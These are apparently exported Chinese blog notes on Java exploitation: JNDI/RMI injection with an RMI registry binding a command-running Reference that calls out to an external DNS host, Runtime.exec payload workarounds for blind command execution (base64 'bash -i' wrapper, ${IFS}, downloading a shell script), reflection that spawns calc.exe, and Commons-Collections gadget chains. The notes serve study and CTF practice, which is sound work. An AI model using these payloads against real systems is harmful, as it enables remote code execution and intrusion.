        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>再另一篇神仙的文章中，有说到在tomcat7下，没有javax.el.ELProcessor，需要额外引入，而tomcat8.5后则自带了，且tomcat自带的包和javax.el的ELProcessor包名相同，完全限定名均为<code>javax.el.ELProcessor</code>，并且似乎javax.el下的ELProcesser好像还没法执行上述payload<br>而tomcat下自带的可以执行<br>分别对应pom中这几个依赖<br>tomcat</p>
<pre class=" language-xml"><code class="language-xml">        <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.5.34<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>com.springsource.org.apache.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>7.0.26<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>javax</p>
<pre class=" language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/javax.el/javax.el-api --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.el-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.1-b06<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>

    <span class="token comment" spellcheck="true">&lt;!-- https://mvnrepository.com/artifact/com.sun.el/el-ri --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.sun.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>el-ri<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
</code></pre>
<p>这里有一个坑，IDEA在我输入javax.el的时候提示我导入Java EE 6（虽然我不知道这个是什么），但是这个玩意和之后maven导入的依赖应该是有冲突的，会超级报错。。。</p>
<p>试了一下tomcat10，好像又把这个依赖给去掉了，改成了jakarta.el，看来利用范围也比较有限</p>
<h4 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h4><p>在2021天翼杯这个比赛中见识到了（说起来应该不难，但是我真的不太会java）<br>用JNDI去连LDAP服务，而LDAP服务存的java对象，除了能Reference对象外，也可以存序列化的对象，只要在返回的对象中存在javaSerializedData这个属性，客户端就会对该属性进行反序列化，通过反序列化用户本地存在的链子进行命令执行</p>
<p>这次的比赛就是这样，给了一个jackson的反序列化，同时还安装了<code>ch.qos.logback</code>和<code>Common-Collection3</code>依赖。我由于完全没有积累，并不知道这个类可以进行JNDI注入，所以只搜到了一个配合h2库进行数据库操作RCE的攻击方式，而题目环境中并未含有此依赖，无法攻击</p>
<p>但是<code>ch.qos.logback</code>这个库还有一个JNDI功能，利用此功能可以进行命令执行<br>攻击方式较为简单，直接生成cc链反序列化的类字节码，放到LDAP服务中返回的<code>javaSerializedData</code>属性中即可<br>至于起一个LDAP服务的话，从网上抄一段代码<br><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">JNDI-Exploit-Bypass-Demo</a><br>还有一个神仙写的基于yso的ysomap工具也能用，做的好高级，和msf的使用方式比较像，就是这个cc8和9是什么东西？好像是把CC再排列组合了一下？功能还蛮多，慢慢看都有啥好玩的<br><a href="https://github.com/wh1t3p1g/ysomap/releases/tag/0.0.1-RLEASE">YSOMAP</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/">浅谈Java RMI Registry安全问题</a><br><a href="https://xz.aliyun.com/t/8706">JAVA RMI 反序列化攻击 &amp; JEP290 Bypass分析</a><br><a href="https://xz.aliyun.com/t/6660">RMI反序列化</a><br><a href="https://xz.aliyun.com/t/8214">JNDI注入学习</a><br><a href="https://paper.seebug.org/942/">如何绕过高版本JDK的限制进行JNDI注入利用</a><br><a href="https://www.xmanblog.net/java-rmi-rce/">深入理解Java RMI反序列化漏洞</a><br><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a><br><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">BlackHat 2016 回顾之 JNDI 注入简单解析</a><br><a href="https://zhuanlan.zhihu.com/p/347364636">Java安全之ysoserial-JRMP模块分析（一）</a><br><a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/033462472c28">openjdk8u242有关readObject的更新</a></p>
<p>两篇关于JNDI注入BeanFactory利用<br><a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/">Exploiting JNDI Injection In Java</a><br><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>RMI</tag>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的奇怪命令执行</title>
    <url>/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</url>
    <content><![CDATA[<h1 id="Java的奇怪命令执行"><a href="#Java的奇怪命令执行" class="headerlink" title="Java的奇怪命令执行"></a>Java的奇怪命令执行</h1><p>最近在打工，做的java CVE复现，用ysoserialize产生一个Java.Runtime.exec的payload命令执行，发现出现了一定的问题</p>
<p>由于没有回显，因此需要想办法验证命令执行的情况，能执行一些简单的命令，比如touch文件，或者curl出来，确实能成功，但是想写shell的时候就遇到了奇怪的问题，没有回显也不知道哪报错，最后通过百度发现问题的根源在于Java.Runtime.exec的诡异实现</p>
<p>也当头一次试着跟进超级多的java类看Java实现，记录一下一切都是怎么回事</p>
<h2 id="Runtime-getRuntime-exec-cmd"><a href="#Runtime-getRuntime-exec-cmd" class="headerlink" title="Runtime.getRuntime().exec(cmd)"></a>Runtime.getRuntime().exec(cmd)</h2><p>IDEAnb!!!!!<br>这调试爱了，整体思路清晰的一逼<br>直接进Runtime.getRuntime().exec(cmd)这句</p>
<p><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"><br>看到调用的是exec(cmd, null, null)<br>再跟，看函数具体实现<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"><br>用cmd创建了一个StringTokenizer，并且把我们传入的cmd用这个st变成了cmdarray，跟进构造方法<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"><br>传入参数为str，也就是我们的cmd，还有一个默认参数delim分隔符为<code> \t\n\r\f</code>(注意开头有一个空格)分别为制表换行回车换页<br>再进一次构造函数<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"><br>在这里可以很清楚的看见这个st的内容，str就是我们的cmd，而分隔符就是刚才构造函数默认的这一段<br>看到第二张图用st构造了一个cmdarray，我们从参数中可以看见再进一个exec时我们的参数从原来的string变成了string数组，看看内容<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"><br>我们的cmd就变成了一个个通过空格分隔的cmdarray<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png"><br>再跟，进了ProcessBuilder，传入的参数是cmdarray，此时输入的cmd已经和我们无缘了，之后都是对打散之后的array进行操作<br>在这个start函数里面进行了一系列的判断检查，最后的进入了ProcessImpl.start<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/7.png"><br>最后的最后进了一个ProcessImpl的构造函数<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/8.png"><br>在这个构造函数里面我们可以清楚的看到关键所在<br><img src="/images/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/9.png"><br><code>String executablePath = new File(cmd[0]).getPath();</code><br>再往后要进入jvm看命令执行的具体过程了。。。不会，看了看网上大哥的结论<br>jvm最后会使用execvp()这个系统调用去执行命令，把我们的executablePath作为可执行文件名，而后面的所有内容全都被视为execvp的参数传入，这样一来，我们反弹shell语句的操作把所有的内容全都变成了参数<br>java的exec和我们常见的python，PHP的system这种命令执行并不一致，这两者的命令执行都是直接将输入放到&#x2F;bin&#x2F;sh里去跑，而java的exec却是自己把第一个参数当二进制文件去找过来执行，并且还把所有字符串按空格分隔当参数，就导致了各种命令执行的不成功</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="直接传入string数组"><a href="#直接传入string数组" class="headerlink" title="直接传入string数组"></a>直接传入string数组</h3><p>如上是exec传入的参数为一个字符串，然后经过一系列处理最后又调用了exec(String[])，如果我们主动出击，直接传入一个Stringarray的话，就能跳过前面几步StringTokenizer，直接到达ProcessBuilder(cmdarray)，数组里的字符串不会再被打断，可以直接命令执行<br>eg:<br><code>String[] cmdarray=&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;cmd&quot;&#125;</code></p>
<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>说到底就是输入全都用空格打断变成了参数，有点像上了个escapeshellarg？或者说想办法进行不需要空格的命令执行？<br>第一个方法看似很棒，但是打java的话基本上都是用ysoserialize去打，而ysoserialize一般直接用Runtime.exec(cmd)这种形式产生payload，看到有一种方法是直接魔改yso创建出cmdarray形式的payload，不过我们这里还是用简单一点的方法<br>用这种形式的base64使得我们整个命令变成一个参数，不会出现被空格打断的情况<br><code>bash -c &#123;echo,base64cmd&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">runtime-exec-payloads</a><br>这个也是最佳解决方案了吧</p>
<h3 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h3><p>经典Linux命令行代替空格的分隔符，大部分情况下的确可以代替空格，不过好像在偶尔还是会有问题？</p>
<h3 id="朴素方案"><a href="#朴素方案" class="headerlink" title="朴素方案"></a>朴素方案</h3><p>远端下载一个shell脚本下来再用bash执行，curl -o下文件，然后任意命令执行</p>
<h3 id="没看懂的方案"><a href="#没看懂的方案" class="headerlink" title="没看懂的方案"></a>没看懂的方案</h3><p><code>sh -c $@|sh . echo cmd</code> $@类似于一个包含所有参数的迭代器，但是这里没有任何参数输入啊？然后再把结果管道符到一个新shell？.搜了一下是source命令(我感觉可能事实上并不是），大概是说保持命令上下文不变？然后执行的也不是脚本是一个echo出来的cmd？<del>忘了这段吧，真完全看不懂呜呜</del><br><a href="http://c.biancheng.net/cpp/view/2739.html">Shell特殊变量</a><br><a href="https://blog.csdn.net/violet_echo_0908/article/details/52056071">Linux下source命令详解</a></p>
<p>并且java的玄幻分隔会把上文分割成[“sh”,”-c”,”$@|sh”, “.”, “echo”, “cmd”]我真觉得跑不起来。。。</p>
<h2 id="其他奇怪的东西"><a href="#其他奇怪的东西" class="headerlink" title="其他奇怪的东西"></a>其他奇怪的东西</h2><p>学这个的过程中一些奇怪的边角知识点</p>
<h3 id="bash的引号括号"><a href="#bash的引号括号" class="headerlink" title="bash的引号括号"></a>bash的引号括号</h3><h4 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h4><p>总觉得引号这段以前学习过<br>双引号，转义空格，重定向，管道什么的（不转义$）<br>单引号，转义一切，包括$</p>
<h4 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h4><p><a href="https://blog.csdn.net/taiyang1987912/article/details/39551385">shell中各种括号的作用</a><br>圆括号()</p>
<blockquote>
<p>命令组。括号中的命令将会新开一个子shell顺序执行</p>
</blockquote>
<p>大括号{}</p>
<blockquote>
<p>代码块，又被称为内部组，这个结构事实上创建了一个<strong>匿名函数</strong> 。与小括号中的命令不同，大括号内的命令不会新开一个子shell运行，即脚本余下部分仍可使用括号内变量。括号内的命令间用分号隔开，最后一个也必须有分号。{}的第一个命令和左括号之间必须要有一个空格。</p>
</blockquote>
<p>但是这里的大括号逗号执行命令好像并不是上面说的内容，测试结果就是{cmd,arg}支持cmd arg这样子的命令运行，无参数可以arg留空，但参数最多只能有一个，也就是说只能绕过一个空格，如果命令存在多个空格，还想用逗号代替就会出错</p>
<h3 id="底层命令执行"><a href="#底层命令执行" class="headerlink" title="底层命令执行"></a>底层命令执行</h3><p>分析的时候可以看到命令执行是从Runtime.exec()进入了ProcessBuilder最后进了ProcessImpl，事实上最后的一步执行应该是调用了ProcessImpl的native方法forkAndExec，这个函数就是它的名字这样，进行fork和exec的系统调用进行命令执行。<br>当目标的防御程度只在ProcessBuilder的时候，就可以直接反射构造ProcessImpl获取其forkAndExec方法进行命令执行</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>罗里吧嗦的说了一大堆，最后命令执行那段还不是自己调试看到的。。。得到的结论其实也很简单<br>Java的Runtime.getRuntime().exec()在传入参数为字符串时，会通过空格将字符串分隔成数组，将数组第一个元素作为可执行文件，后面所有元素作为参数进行系统调用execvp完成命令执行<br>因此导致了奇怪的命令执行失败<br>最稳定解决方案为base64编码</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/7046">Java Runtime.getRuntime().exec由表及里</a><br><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Java下奇怪的命令执行</a><br><a href="https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg">在 Runtime.getRuntime().exec(String cmd) 中执行任意shell命令的几种方法</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化入门</title>
    <url>/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="Java反序列化入门"><a href="#Java反序列化入门" class="headerlink" title="Java反序列化入门"></a>Java反序列化入门</h1><p>最近打工需要学这个，同样是反序列化，Python和PHP的就好理解多了，Java的果然还是复杂不少。。。<br>主要是对Java的各种架构也都不怎么理解，需要进行一个从零开始的入门<br>呜呜呜我好菜</p>
<h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>反射是Java反序列化的一大关键利用点<br>说实话，一开始完全看不懂为什么要叫反射这么个名字，我觉得应该先明白反射是怎么回事，如下反射介绍部分均参考文末大哥链接，”正射”这个概念的提出感觉就让人豁然开朗了，很强</p>
<h3 id="“反射”"><a href="#“反射”" class="headerlink" title="“反射”"></a>“反射”</h3><p>反射之所以叫“反”射，必然是其方式是反过来的，所以我们要先知道什么是“正射”<br>“正射”很简单，就是我们平常正常的对类的使用，比如</p>
<pre class=" language-java"><code class="language-java">Apple apple <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//直接初始化，「正射」</span>
apple<span class="token punctuation">.</span><span class="token function">setPrice</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>我们在类初始化的时候直接指定对应的类进行初始化，并且静态的调用对应的方法</p>
<p>而反射则是一开始完全不知道类是什么，需要在运行的时候动态的加载类，动态的获取类的方法，动态的发起调用<br>就像这样</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.chenshuyi.reflect.Apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Method method <span class="token operator">=</span> clz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"setPrice"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Constructor constructor <span class="token operator">=</span> clz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Object object <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<blockquote>
<p>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</p>
</blockquote>
<h3 id="反射常用函数"><a href="#反射常用函数" class="headerlink" title="反射常用函数"></a>反射常用函数</h3><h4 id="获取class对象"><a href="#获取class对象" class="headerlink" title="获取class对象"></a>获取class对象</h4><p>Class.forName方法接受一个字符串，返回字符串对应的类实例</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这个方法也是java反序列化中最常用的方法</p>
<p>类名.class和类实例.getClass()方法<br>不怎么灵活，感觉只能加载已经存在的并且是编译前就写死的类</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clz</span> <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
</code></pre>
<pre class=" language-java"><code class="language-java">String str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Class <span class="token class-name">clz</span> <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>`
</code></pre>
<h4 id="获取对象属性"><a href="#获取对象属性" class="headerlink" title="获取对象属性"></a>获取对象属性</h4><p>getFields()方法获取Class类的所有属性，不能获取私有属性<br>getDeclaredFields()获取包括私有属性的全部属性<br>同getMethods()和getDeclaredMethods()获取类的方法<br>Constructor同理</p>
<p>如上方法可以类名.class的方式传递参数，获取参数为指定类的方法(getFields估计不行，获取方法的函数应该都行)<br>例：<br><code>Constructor constructor = clz.getConstructor(String.class, int.class);</code><br>获取第一个参数是String，第二个参数是int的构造方法</p>
<h4 id="创建类实例"><a href="#创建类实例" class="headerlink" title="创建类实例"></a>创建类实例</h4><p>Class对象的newInstance() 方法&amp;Constructor对象的newInstance()方法。</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clz</span> <span class="token operator">=</span> Apple<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
Apple apple <span class="token operator">=</span> <span class="token punctuation">(</span>Apple<span class="token punctuation">)</span>clz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clz</span> <span class="token operator">=</span> Apple<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
Constructor constructor <span class="token operator">=</span> clz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Apple apple <span class="token operator">=</span> <span class="token punctuation">(</span>Apple<span class="token punctuation">)</span>constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>Constructor对象的newInstance方法可以指定参数，Class的只能用默认的无参数构造方法</p>
<h4 id="invoke函数"><a href="#invoke函数" class="headerlink" title="invoke函数"></a>invoke函数</h4><blockquote>
<p>作用：调用包装在当前Method对象中的方法。<br>原型：Object invoke(Object obj,Object…args)<br>参数解释：obj：持有Method中封装方法的类对象<br>args：用于方法调用的参数</p>
</blockquote>
<p>如下代码完成了反射弹计算器</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
    Object runtime<span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>

    Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>getMethod方法返回的并不是对应类的方法，而是一个封装了对应类方法的Method对象，而invoke函数则是调用封装在Method对象中的方法，所以如上代码先是通过invoke调用封装了getRuntime方法的Method对象获取了一个runtime对象，再获取一个封装了exec的Method对象调用invoke方法执行exec函数</p>
<p>总而言之，就是<code>getMethod(&quot;func&quot;).invoke(obj,arg...)</code>就是<code>obj.func(arg...)</code></p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>出现在ObjectInputStream的readObject方法中，当目标对象重写了readObject时，就会使用重写方法<br>若重写的方法中存在一定的操作，就有机会通过操作去寻找可利用类，最终实现漏洞利用</p>
<blockquote>
<p>最近重新从头开始学了下Java，在一切理清楚的情况下感觉并没有这么复杂，之前写的垃圾作废，推倒重来</p>
</blockquote>
<h3 id="利用链介绍"><a href="#利用链介绍" class="headerlink" title="利用链介绍"></a>利用链介绍</h3><p>参考链接中使用了一个AnnotationInvocationHandler为宿主，TransformedMap为媒介，ChainedTransformer为病毒的利用链</p>
<h4 id="AnnotationInvocationHandler-gt-TransformedMap-gt-ChainedTransformer"><a href="#AnnotationInvocationHandler-gt-TransformedMap-gt-ChainedTransformer" class="headerlink" title="AnnotationInvocationHandler-&gt;TransformedMap-&gt;ChainedTransformer"></a>AnnotationInvocationHandler-&gt;TransformedMap-&gt;ChainedTransformer</h4><p>AnnotationInvocationHandler类在readObject方法中遍历了自己一个Map成员的memberValues属性，并且对其中的Entry对象执行了setValue操作<br>Map类TransformedMap，该类的Entry的Key或者Value进行改变的时候，对该Key和Value进行Transformer提供的转换操作<br>ChainedTransformer通过对其含有的所有Transformer依次执行transform，进行命令执行<br>AnnotationInvocationHandler类在后续补丁上已经去掉了这个setValue操作，因此我们还有另一个类可以用来当做宿主</p>
<h4 id="BadAttributeValueExpException-gt-TiedMapEntry-gt-LazyMap-gt-ChainedTransformer"><a href="#BadAttributeValueExpException-gt-TiedMapEntry-gt-LazyMap-gt-ChainedTransformer" class="headerlink" title="BadAttributeValueExpException-&gt;TiedMapEntry-&gt;LazyMap-&gt;ChainedTransformer"></a>BadAttributeValueExpException-&gt;TiedMapEntry-&gt;LazyMap-&gt;ChainedTransformer</h4><p><code>BadAttributeValueExpException</code>，这个类在很多java反序列化的CVE中均有出没，而其代码内容从未被更改，漏洞的修补均是修改其他处限制或设置黑白名单，可能就开发人员而言，这个类的实现并没有问题</p>
<p>这个类的readObject方法是获取自己一个名为val的属性，并在一系列判断后调用val.toString()方法<br>找到LazyMap这个类，这个类在使用get方法去查找一个不存在值时，会触发自身Transformer对象的transform方法，对ChainedTransformer进行transform一把点爆<br>但是还需要一个从BadAttributeValueExpException的toString到LazyMap的get方法的中继，我们继续寻找，得到类TiedMapEntry，该类中重写了toString函数，并在其中调用了getValue()，而getValue则进一步调用了map.get(key)，将宿主和另一个媒介串联起来，完成利用</p>
<h4 id="AnnotationInvocationHandler-gt-LazyMap-gt-ChainedTransformer"><a href="#AnnotationInvocationHandler-gt-LazyMap-gt-ChainedTransformer" class="headerlink" title="AnnotationInvocationHandler-&gt;LazyMap-&gt;ChainedTransformer"></a>AnnotationInvocationHandler-&gt;LazyMap-&gt;ChainedTransformer</h4><p>这个是rmb神仙写的分析，详细一点，但利用链和前面的例子差距不大，可以解释前两个例子中粗略描述的调用过程<br>调用栈</p>
<pre class=" language-java"><code class="language-java">Gadget chain<span class="token operator">:</span>
    ObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        AnnotationInvocationHandler<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
